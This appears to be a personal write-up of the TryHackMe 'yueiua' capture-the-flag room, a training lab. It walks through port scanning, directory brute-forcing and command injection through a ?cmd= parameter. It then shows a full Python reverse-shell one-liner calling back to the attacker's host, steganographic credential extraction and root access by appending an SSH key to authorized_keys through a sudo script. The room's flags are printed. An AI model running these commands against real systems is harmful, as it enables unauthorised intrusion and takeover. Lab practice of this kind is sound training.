@@ -1,0 +1,171 @@
+------------Tryhackme yeuia room--------------
+Date: 18-09-2024
+Limk: https://tryhackme.com/r/room/yueiua
+Auhaur: Petstar
+
+
+---Port scanning----
+-->rustscan -a 10.10.16.107 -- -A -sV -sC -O -Pn
+Open 10.10.16.107:22
+Open 10.10.16.107:80
+
+---Port 80 enumeration----
+gobuster dir -u http://10.10.16.107/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.16.107/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 313] [--> http://10.10.16.107/assets/]                                                       
+Progress: 37120 / 207644 (17.88%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 37146 / 207644 (17.89%)
+===============================================================
+Finished
+===============================================================
+
+
+gobuster dir -u http://10.10.16.107/assets -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -x .php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.16.107/assets
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 320] [--> http://10.10.16.107/assets/images/]
+/index.php            (Status: 200) [Size: 0]
+/.php                 (Status: 403) [Size: 277]
+
+
+So we was on index.php and i have try ?cmd=ls and bingoo 😇️ it works 
+
+http://10.10.16.107/assets/index.php?cmd=ls
+
+aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==  ---> result --> images index.php styles.css
+
+I thhink it list the content of the directory so i will try reverse shell and web shell.
+
+10.10.16.107/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.9.70",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+
+
+it works after putting this command and running my listner
+
+www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
+cat passphrase.txt
+QWxsbWlnaHRGb3JFdmVyISEhCg==  ---> AllmightForEver!!!
+www-data@myheroacademia:/var/www/Hidden_Content$ 
+
+We ger inage oneforall.jpg which is in the folder /assets/images and try to extract file in it, But Nothing because image is not opnable. After that i notice that the signature differs than normal jpg. So we remplace 8 first duo of characters by 
+
+--> FF D8 FF E0  00 10 4A 46 
+
+After that we try again to extract file hiddesn in it.
+
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/yeuia]
+└─# steghide extract -sf oneforallmodg.jpg 
+Enter passphrase: 
+wrote extracted data to "creds.txt".
+
+
+
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/yeuia]
+└─# cat creds.txt                                              
+Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
+
+deku:One?For?All_!!one1/A
+                                                                    
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/yeuia]
+└─# 
+
+
+So we have deku password. After connecting myself i read the user.txt and do sudo-l command to see. 
+
+
+deku@myheroacademia:~$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@myheroacademia:~$ cat user.txt 
+THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+deku@myheroacademia:~$ 
+
+We aere going to create ssh key 
+-->ssh-keygen -t ed25519 -f root                       
+Generating public/private ed25519 key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in root
+Your public key has been saved in root.pub
+The key fingerprint is:
+SHA256:2lCl3lfufdzaScF7jqcGqJnHd5+fIH6K4jrz8guMM7w root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|          .      |
+|         o       |
+|        o     .  |
+|       o .   o.  |
+|      . S ... .o |
+|  . o  +  .... o+|
+|   = o. .= . o.o*|
+|    ++..+ = o.==B|
+|   E .O=oo +oo+B*|
++----[SHA256]-----+
+   
+   
+After that run the script to put our sshkey into authorised_key
+
+eku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINbTP7nbe3VUT6sE2sxrGxsMDcw6HdydiLCKaNZfhIEf root@kali' >> /root/.ssh/authorized_keys            
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ 
+
+After we are going to connect to ssh
+--> ssh -i root root@10.10.63.29
+
+root@myheroacademia:~# cat root.txt
+root@myheroacademia:/opt/NewComponent# cat /root/root.txt
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                  _    _ 
+             _   _        ___    | |  | |
+            | \ | | ___  /   |   | |__| | ___ _ __  ___
+            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
+            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
+            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
+
+THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+
+root@myheroacademia:~# 
+
